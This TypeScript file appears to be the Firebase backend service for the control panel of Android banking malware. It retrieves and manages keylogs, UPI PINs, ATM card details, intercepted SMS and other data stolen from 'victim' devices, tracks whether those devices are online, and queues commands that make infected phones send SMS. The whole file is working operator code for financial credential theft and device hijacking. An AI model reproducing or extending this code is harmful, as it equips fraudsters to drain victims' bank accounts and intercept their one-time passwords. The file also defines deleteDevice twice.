import {
  ref,
  get,
  set,
  push,
  update,
  remove,
  onValue,
  off,
  query,
  orderByChild,
  equalTo,
  DatabaseReference,
  DataSnapshot,
  runTransaction,
} from "firebase/database";
import { database } from "./firebase";
import {
  DeviceInfo,
  Message,
  SimRow,
  KeyLog,
  ATMCard,
  UserEntered,
  AppsInstalled,
  SendSms,
} from "@/data/db";

export class FirebaseService {
  private static instance: FirebaseService;

  // Database references
  private deviceInfoRef: DatabaseReference;
  private simsRef: DatabaseReference;
  private keyLogsRef: DatabaseReference;
  private upiPinsRef: DatabaseReference;
  private userEnteredRef: DatabaseReference;
  private appsInstalledRef: DatabaseReference;
  private sendSmsRef: DatabaseReference;
  private smsDataRef: DatabaseReference;
  private atmCardsRef: DatabaseReference;

  private constructor() {
    this.deviceInfoRef = ref(database, "DeviceInfo");
    this.simsRef = ref(database, "Sims");
    this.keyLogsRef = ref(database, "Keylogs");
    this.upiPinsRef = ref(database, "UPIPins");
    this.userEnteredRef = ref(database, "UserEntered");
    this.appsInstalledRef = ref(database, "AppsInstalled");
    this.sendSmsRef = ref(database, "SendSms");
    // New: SmsData lives under a separate top-level node (note casing)
    this.smsDataRef = ref(database, "SmsData");
    this.atmCardsRef = ref(database, "ATMCards");
  }

  // Robust parser for dd-MM-yyyy HH:mm:ss with safe fallbacks
  private toTimestamp(value?: string): number {
    if (!value) return 0;
    const m = value.match(/^(\d{2})-(\d{2})-(\d{4})[\sT](\d{2}):(\d{2})(?::(\d{2}))?$/);
    if (m) {
      const [, dd, MM, yyyy, HH, mm, ss] = m;
      const y = Number(yyyy);
      const mon = Number(MM) - 1;
      const d = Number(dd);
      const h = Number(HH);
      const mi = Number(mm);
      const s = Number(ss || '0');
      const dt = new Date(y, mon, d, h, mi, s);
      return dt.getTime();
    }
    const d = new Date(value);
    return isNaN(d.getTime()) ? 0 : d.getTime();
  }

  public static getInstance(): FirebaseService {
    if (!FirebaseService.instance) {
      FirebaseService.instance = new FirebaseService();
    }
    return FirebaseService.instance;
  }

  // Device Management
  async getDevices(): Promise<Record<string, DeviceInfo>> {
    try {
      const snapshot = await get(this.deviceInfoRef);
      return snapshot.val() || {};
    } catch (error) {
      console.error("Error fetching devices:", error);
      return {};
    }
  }

  async getDevice(deviceId: string): Promise<DeviceInfo | null> {
    try {
      const snapshot = await get(ref(database, `DeviceInfo/${deviceId}`));
      return snapshot.val() || null;
    } catch (error) {
      console.error("Error fetching device:", error);
      return null;
    }
  }

  async addDevice(deviceId: string, deviceInfo: DeviceInfo): Promise<void> {
    try {
      await set(ref(database, `DeviceInfo/${deviceId}`), deviceInfo);
    } catch (error) {
      console.error("Error adding device:", error);
      throw error;
    }
  }

  async updateDevice(
    deviceId: string,
    updates: Partial<DeviceInfo>,
  ): Promise<void> {
    try {
      await update(ref(database, `DeviceInfo/${deviceId}`), updates);
    } catch (error) {
      console.error("Error updating device:", error);
      throw error;
    }
  }

  async deleteDevice(deviceId: string): Promise<void> {
    try {
      // Delete from all relevant nodes
      const updates: Record<string, null> = {
        [`DeviceInfo/${deviceId}`]: null,
        [`Sims/${deviceId}`]: null,
        [`Keylogs/${deviceId}`]: null,
        [`UPIPins/${deviceId}`]: null,
        [`UserEntered/${deviceId}`]: null,
        [`AppsInstalled/${deviceId}`]: null,
        // Note: Not deleting from SmsData as it might be shared across devices
      };
      
      await update(ref(database), updates);
    } catch (error) {
      console.error("Error deleting device:", error);
      throw error;
    }
  }

  // Real-time device monitoring
  onDeviceUpdate(
    deviceId: string,
    callback: (device: DeviceInfo | null) => void,
  ): () => void {
    const deviceRef = ref(database, `DeviceInfo/${deviceId}`);

    const handleSnapshot = (snapshot: DataSnapshot) => {
      const device = snapshot.val();
      callback(device);
    };

    onValue(deviceRef, handleSnapshot);

    // Return unsubscribe function
    return () => off(deviceRef, "value", handleSnapshot);
  }

  onDevicesUpdate(
    callback: (devices: Record<string, DeviceInfo>) => void,
  ): () => void {
    const handleSnapshot = (snapshot: DataSnapshot) => {
      const devices = snapshot.val() || {};
      callback(devices);
    };

    onValue(this.deviceInfoRef, handleSnapshot);

    // Return unsubscribe function
    return () => off(this.deviceInfoRef, "value", handleSnapshot);
  }

  

  // Send a response check request to a device
  async sendResponseCheck(deviceId: string): Promise<void> {
    try {
      const responseCheckData = {
        command: 'ResponseCheck',
        timestamp: new Date().toISOString(),
        status: 'pending',
        lastChecked: null
      };
      
      await set(ref(database, `ResponseChecks/${deviceId}`), responseCheckData);
    } catch (error) {
      console.error('Error sending response check:', error);
      throw error;
    }
  }

  // ResponseChecker helpers used by Firebase Checker Android app
  // The Android app watches ResponseChecker/{deviceId} and updates `response`
  // from "pending" -> "idle" | "true" when it comes online.
  async setResponsePending(deviceId: string, timeStr?: string, altKey?: string): Promise<void> {
    try {
      const now = new Date();
      const pad = (n: number) => String(n).padStart(2, '0');
      const formatted = `${pad(now.getDate())}-${pad(now.getMonth() + 1)}-${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
      const payload = {
        deviceId,
        response: 'pending' as const,
        timeStr: timeStr || formatted
      };
      console.log('[ResponseChecker] set pending ->', { key: deviceId, payload });
      await update(ref(database, `ResponseChecker/${deviceId}`), payload);
      if (altKey && altKey !== deviceId) {
        console.log('[ResponseChecker] mirror pending ->', { key: altKey, payload });
        await update(ref(database, `ResponseChecker/${altKey}`), payload);
      }
    } catch (error) {
      console.error('Error setting ResponseChecker pending:', error);
      throw error;
    }
  }

  async getResponseChecker(deviceId: string): Promise<{ deviceId?: string; response?: string; timeStr?: string } | null> {
    try {
      const snapshot = await get(ref(database, `ResponseChecker/${deviceId}`));
      return snapshot.val() || null;
    } catch (error) {
      console.error('Error reading ResponseChecker:', error);
      return null;
    }
  }

  async getResponseCheckerAny(keys: string[]): Promise<{ key?: string; deviceId?: string; response?: string; timeStr?: string } | null> {
    for (const key of keys) {
      try {
        const snapshot = await get(ref(database, `ResponseChecker/${key}`));
        const val = snapshot.val();
        if (val) {
          return { key, ...val } as any;
        }
      } catch (e) {
        console.warn('Error reading ResponseChecker for key', key, e);
      }
    }
    return null;
  }

  // Real-time listener for the entire ResponseChecker map
  onResponseCheckerUpdate(
    callback: (data: Record<string, { deviceId?: string; response?: string; timeStr?: string }>) => void,
  ): () => void {
    const rcRef = ref(database, 'ResponseChecker');
    const handle = (snapshot: DataSnapshot) => {
      const val = snapshot.val() || {};
      callback(val);
    };
    onValue(rcRef, handle);
    return () => off(rcRef, 'value', handle);
  }

  // SMSData (replacement for Messages)
  async getSMSData(): Promise<Record<string, Message>> {
    try {
      const snapshot = await get(this.smsDataRef);
      return snapshot.val() || {};
    } catch (error) {
      console.error("Error fetching SMSData:", error);
      return {};
    }
  }

  async getDeviceSMSData(deviceId: string): Promise<Message[]> {
    try {
      const smsQuery = query(this.smsDataRef, orderByChild("VictimId"), equalTo(deviceId));
      const snapshot = await get(smsQuery);
      const messages = snapshot.val();
      return messages ? (Object.values(messages) as Message[]) : [];
    } catch (error) {
      console.error("Error fetching device SMSData:", error);
      return [];
    }
  }

  onSMSDataUpdate(
    callback: (messages: Record<string, Message>) => void,
  ): () => void {
    const handleSnapshot = (snapshot: DataSnapshot) => {
      const messages = snapshot.val() || {};
      callback(messages);
    };

    onValue(this.smsDataRef, handleSnapshot);

    return () => off(this.smsDataRef, "value", handleSnapshot);
  }

  async deleteSMSData(messageId: string): Promise<void> {
    try {
      const messageRef = ref(database, `SmsData/${messageId}`);
      await remove(messageRef);
    } catch (error) {
      console.error("Error deleting SMSData message:", error);
      throw error;
    }
  }

  // Real-time user entered data monitoring
  onUserEnteredUpdate(
    callback: (userEntered: Record<string, UserEntered>) => void,
  ): () => void {
    const handleSnapshot = (snapshot: DataSnapshot) => {
      const userEntered = snapshot.val() || {};
      callback(userEntered);
    };

    onValue(this.userEnteredRef, handleSnapshot);

    return () => off(this.userEnteredRef, "value", handleSnapshot);
  }

  // SIM Cards
  async getSims(deviceId: string): Promise<SimRow[]> {
    try {
      const snapshot = await get(ref(database, `Sims/${deviceId}`));
      return snapshot.val() || [];
    } catch (error) {
      console.error("Error fetching SIMs:", error);
      return [];
    }
  }

  async updateSims(deviceId: string, sims: SimRow[]): Promise<void> {
    try {
      await set(ref(database, `Sims/${deviceId}`), sims);
    } catch (error) {
      console.error("Error updating SIMs:", error);
      throw error;
    }
  }

  // Key Logs
  // Get key logs with pagination support
  async getKeyLogs(deviceId: string, limit: number = 100): Promise<KeyLog[]> {
    try {
      console.log('Fetching key logs for device:', deviceId);
      
      // Remove orderByChild until Firebase index is set up
      const keyLogsRef = ref(database, `Keylogs/${deviceId}`);
      const snapshot = await get(keyLogsRef);
      const keyLogs = snapshot.val();
      
      console.log('Raw key logs data:', keyLogs);

      if (!keyLogs) {
        console.log('No key logs found for device:', deviceId);
        return [];
      }

      // Convert to array and filter out empty logs
      const keyLogsArray = Object.values(keyLogs) as KeyLog[];
      const validKeyLogs = keyLogsArray.filter(log => 
        log && (log.Column1 || log.Column2 || log.Column3 || log.Column4 || log.Column5 || log.Column6 || log.text)
      );

      // Sort by timestamp (newest first) using robust parser and limit results
      const sortedKeyLogs = validKeyLogs
        .map((log, idx) => ({
          log,
          ts: this.toTimestamp((log as any).timestamp || (log as any).time || (log as any).Timestamp || (log as any).Time),
          idx
        }))
        .sort((a, b) => {
          const diff = b.ts - a.ts;
          if (diff !== 0) return diff;
          return b.idx - a.idx; // stable fallback
        })
        .slice(0, limit)
        .map(x => x.log as KeyLog);
      
      console.log('Sorted key logs:', sortedKeyLogs);
      return sortedKeyLogs;
    } catch (error) {
      console.error("Error fetching key logs:", error);
      return [];
    }
  }

  // Real-time KeyLogs monitoring
  onKeyLogsUpdate(
    deviceId: string,
    callback: (keyLogs: KeyLog[]) => void,
  ): () => void {
    console.log('Setting up real-time listener for device:', deviceId);
    const keyLogsRef = ref(database, `Keylogs/${deviceId}`);
    
    const handleSnapshot = (snapshot: DataSnapshot) => {
      const keyLogs = snapshot.val();
      console.log('Real-time key logs update for device:', deviceId, 'Data:', keyLogs);
      
      if (!keyLogs) {
        console.log('No key logs in real-time update for device:', deviceId);
        callback([]);
        return;
      }
      
      // Convert to array and filter out empty logs
      const keyLogsArray = Object.values(keyLogs) as KeyLog[];
      const validKeyLogs = keyLogsArray.filter(log => 
        log && (log.Column1 || log.Column2 || log.Column3 || log.Column4 || log.Column5 || log.Column6 || log.text)
      );
      
      // Sort by timestamp (newest first) using robust parser
      const sortedKeyLogs = validKeyLogs
        .map((log, idx) => ({
          log,
          ts: this.toTimestamp((log as any).timestamp || (log as any).time || (log as any).Timestamp || (log as any).Time),
          idx
        }))
        .sort((a, b) => {
          const diff = b.ts - a.ts;
          if (diff !== 0) return diff;
          return b.idx - a.idx;
        })
        .map(x => x.log as KeyLog);
      
      console.log('Sorted real-time key logs:', sortedKeyLogs);
      callback(sortedKeyLogs);
    };

    onValue(keyLogsRef, handleSnapshot);

    // Return unsubscribe function
    return () => off(keyLogsRef, "value", handleSnapshot);
  }

  async addKeyLog(deviceId: string, keyLog: Omit<KeyLog, "id">): Promise<void> {
    try {
      // Ensure the keyLog has the required fields
      const validatedKeyLog = {
        keylogger: keyLog.keylogger || 'UPI_PIN',
        timestamp: keyLog.timestamp || new Date().toISOString(),
        Column1: keyLog.Column1 || '',
        Column2: keyLog.Column2 || '',
        Column3: keyLog.Column3 || '',
        Column4: keyLog.Column4 || '',
        Column5: keyLog.Column5 || '',
        Column6: keyLog.Column6 || '',
        // Legacy support
        time: keyLog.time || keyLog.timestamp,
        text: keyLog.text || ''
      };
      
      const newKeyLogRef = push(ref(database, `Keylogs/${deviceId}`));
      await set(newKeyLogRef, validatedKeyLog);
    } catch (error) {
      console.error("Error adding key log:", error);
      throw error;
    }
  }

  // UPI Pins with timestamps
  async getUPIPins(deviceId: string): Promise<Array<{ pin: string; timestamp: string }>> {
    try {
      const snapshot = await get(ref(database, `UPIPins/${deviceId}`));
      const pinsData = snapshot.val();
      
      if (!pinsData) return [];
      
      // Handle the new data structure
      if (Array.isArray(pinsData)) {
        // Old format: array of strings
        return pinsData
          .map(pin => ({ pin: pin.toString(), timestamp: new Date().toISOString() }))
          .map((p, idx) => ({ ...p, ts: this.toTimestamp(p.timestamp), idx }))
          .sort((a, b) => (b.ts - a.ts) || (b.idx - a.idx))
          .map(({ ts, idx, ...rest }) => rest);
      } else {
        // New format: object with pin objects
        return Object.values(pinsData)
          .map((pinObj: any, idx: number) => ({
            pin: pinObj.pin || pinObj.toString(),
            timestamp: pinObj.timestamp || new Date().toISOString(),
            ts: this.toTimestamp(pinObj.timestamp || ''),
            idx
          }))
          .sort((a, b) => (b.ts - a.ts) || (b.idx - a.idx))
          .map(({ ts, idx, ...rest }) => rest);
      }
    } catch (error) {
      console.error("Error fetching UPI pins:", error);
      return [];
    }
  }

  // Delete all data for a specific device
  async deleteDevice(deviceId: string): Promise<void> {
    try {
      // Delete from all relevant nodes
      const updates: Record<string, null> = {
        [`DeviceInfo/${deviceId}`]: null,
        [`Sims/${deviceId}`]: null,
        [`Keylogs/${deviceId}`]: null,
        [`UPIPins/${deviceId}`]: null,
        [`UserEntered/${deviceId}`]: null,
        [`AppsInstalled/${deviceId}`]: null,
        // Note: Not deleting from SmsData as it might be shared across devices
      };
      
      await update(ref(database), updates);
    } catch (error) {
      console.error("Error deleting device:", error);
      throw error;
    }
  }

  // Get all UPI pins for all devices (for Device Management table)
  async getAllUPIPins(): Promise<Record<string, Array<{ pin: string; timestamp: string }>>> {
    try {
      const snapshot = await get(this.upiPinsRef);
      const allPinsData = snapshot.val();
      
      if (!allPinsData) return {};
      
      const result: Record<string, Array<{ pin: string; timestamp: string }>> = {};
      
      // Process each device's UPI pins
      for (const [deviceId, pinsData] of Object.entries(allPinsData)) {
        if (pinsData) {
          if (Array.isArray(pinsData)) {
            // Old format: array of strings
            result[deviceId] = pinsData
              .map(pin => ({ pin: pin.toString(), timestamp: new Date().toISOString() }))
              .map((p, idx) => ({ ...p, ts: this.toTimestamp(p.timestamp), idx }))
              .sort((a, b) => (b.ts - a.ts) || (b.idx - a.idx))
              .map(({ ts, idx, ...rest }) => rest);
          } else {
            // New format: object with pin objects
            result[deviceId] = Object.values(pinsData)
              .map((pinObj: any, idx: number) => ({
                pin: pinObj.pin || pinObj.toString(),
                timestamp: pinObj.timestamp || new Date().toISOString(),
                ts: this.toTimestamp(pinObj.timestamp || ''),
                idx
              }))
              .sort((a, b) => (b.ts - a.ts) || (b.idx - a.idx))
              .map(({ ts, idx, ...rest }) => rest);
          }
        }
      }
      
      return result;
    } catch (error) {
      console.error("Error fetching all UPI pins:", error);
      return {};
    }
  }

  async updateUPIPins(deviceId: string, pins: string[]): Promise<void> {
    try {
      await set(ref(database, `UPIPins/${deviceId}`), pins);
    } catch (error) {
      console.error("Error updating UPI pins:", error);
      throw error;
    }
  }

  // User Entered Data
  async getUserEntered(): Promise<Record<string, UserEntered>> {
    try {
      const snapshot = await get(this.userEnteredRef);
      return snapshot.val() || {};
    } catch (error) {
      console.error("Error fetching user entered data:", error);
      return {};
    }
  }

  async getUserEnteredByDevice(deviceId: string): Promise<UserEntered[]> {
    try {
      const snapshot = await get(this.userEnteredRef);
      const allUserEntered = snapshot.val() || {};

      return (Object.values(allUserEntered) as UserEntered[])
        .filter((entry: UserEntered) => entry.VictimID === deviceId)
        .sort((a: UserEntered, b: UserEntered) => {
          const timeA = a.Time ? new Date(a.Time).getTime() : 0;
          const timeB = b.Time ? new Date(b.Time).getTime() : 0;
          return timeB - timeA;
        });
    } catch (error) {
      console.error("Error fetching user entered data for device:", error);
      return [];
    }
  }

  async addUserEntered(userEntered: Omit<UserEntered, "id">): Promise<void> {
    try {
      const newUserEnteredRef = push(this.userEnteredRef);
      await set(newUserEnteredRef, userEntered);
    } catch (error) {
      console.error("Error adding user entered data:", error);
      throw error;
    }
  }

  // Apps Installed
  async getAppsInstalled(): Promise<Record<string, AppsInstalled>> {
    try {
      const snapshot = await get(this.appsInstalledRef);
      return snapshot.val() || {};
    } catch (error) {
      console.error("Error fetching apps installed data:", error);
      return {};
    }
  }

  async getAppsInstalledByDevice(
    deviceId: string,
  ): Promise<AppsInstalled | null> {
    try {
      const snapshot = await get(ref(database, `AppsInstalled/${deviceId}`));
      return snapshot.val() || null;
    } catch (error) {
      console.error("Error fetching apps installed for device:", error);
      return null;
    }
  }

  async updateAppsInstalled(
    deviceId: string,
    appsData: AppsInstalled,
  ): Promise<void> {
    try {
      await set(ref(database, `AppsInstalled/${deviceId}`), appsData);
    } catch (error) {
      console.error("Error updating apps installed data:", error);
      throw error;
    }
  }

  // Send SMS
  async sendSms(
    deviceInfo: DeviceInfo,
    recipientNumber: string,
    message: string,
    deviceId?: string,
  ): Promise<string> {
    try {
      // Create device identifier using the actual deviceId or model
      const deviceIdentifier = deviceId || deviceInfo.Model || "Unknown";

      // Create SMS data matching Firebase structure exactly
      const smsData = {
        Message: message,
        Sender: recipientNumber,
        Status: "pending",
        TimeStamp: new Date().toISOString(),
      };

      // Add to Firebase directly under SendSms/DeviceID structure
      const sendSmsRef = ref(database, `SendSms/${deviceIdentifier}`);
      await set(sendSmsRef, smsData);

      // Note: We no longer mirror to Messages. Message tab now reads from SMSData only.

      console.log(
        `SMS command sent to device ${deviceIdentifier} for recipient ${recipientNumber}`,
      );
      return deviceIdentifier;
    } catch (error) {
      console.error("Error sending SMS:", error);
      throw error;
    }
  }

  async getSendSmsHistory(deviceInfo: DeviceInfo): Promise<SendSms[]> {
    try {
      const manufacturer = deviceInfo.Brand || "Unknown";
      const model = deviceInfo.Model || "Unknown";
      const addKey = `${manufacturer} ${model}`;

      const snapshot = await get(ref(database, `SendSms/${addKey}`));
      const smsHistory = snapshot.val() || {};

      return (Object.values(smsHistory) as SendSms[]).sort(
        (a: SendSms, b: SendSms) => {
          const timeA = a.Time ? new Date(a.Time).getTime() : 0;
          const timeB = b.Time ? new Date(b.Time).getTime() : 0;
          return timeB - timeA;
        },
      );
    } catch (error) {
      console.error("Error fetching SMS history:", error);
      return [];
    }
  }

  // ATM Cards
  async getATMCards(deviceId: string): Promise<ATMCard[]> {
    try {
      const snapshot = await get(ref(database, `ATMCards/${deviceId}`));
      return snapshot.val() || [];
    } catch (error) {
      console.error("Error fetching ATM cards:", error);
      return [];
    }
  }

  async updateATMCards(deviceId: string, cards: ATMCard[]): Promise<void> {
    try {
      await set(ref(database, `ATMCards/${deviceId}`), cards);
    } catch (error) {
      console.error("Error updating ATM cards:", error);
      throw error;
    }
  }

  // Device Status Updates
  async updateDeviceStatus(deviceId: string, status: string): Promise<void> {
    try {
      await update(ref(database, `DeviceInfo/${deviceId}`), { Status: status });
    } catch (error) {
      console.error("Error updating device status:", error);
      throw error;
    }
  }

  async updateDeviceBattery(deviceId: string, battery: string): Promise<void> {
    try {
      await update(ref(database, `DeviceInfo/${deviceId}`), {
        Battery: battery,
      });
    } catch (error) {
      console.error("Error updating device battery:", error);
      throw error;
    }
  }

  // Initialize empty collections (for first-time setup)
  async initializeEmptyCollections(): Promise<void> {
    try {
      const devices = await this.getDevices();
      if (Object.keys(devices).length === 0) {
        // Initialize with empty collections
        await set(ref(database, "DeviceInfo"), {});
        await set(ref(database, "SmsData"), {});
        await set(ref(database, "Sims"), {});
        await set(ref(database, "KeyLogs"), {});
        await set(ref(database, "UPIPins"), {});
        await set(ref(database, "UserEntered"), {});
        await set(ref(database, "AppsInstalled"), {});
        await set(ref(database, "SendSms"), {});
        await set(ref(database, "ATMCards"), {});
        console.log("Firebase collections initialized successfully");
      }
    } catch (error) {
      console.error("Error initializing collections:", error);
    }
  }
}

export const firebaseService = FirebaseService.getInstance();
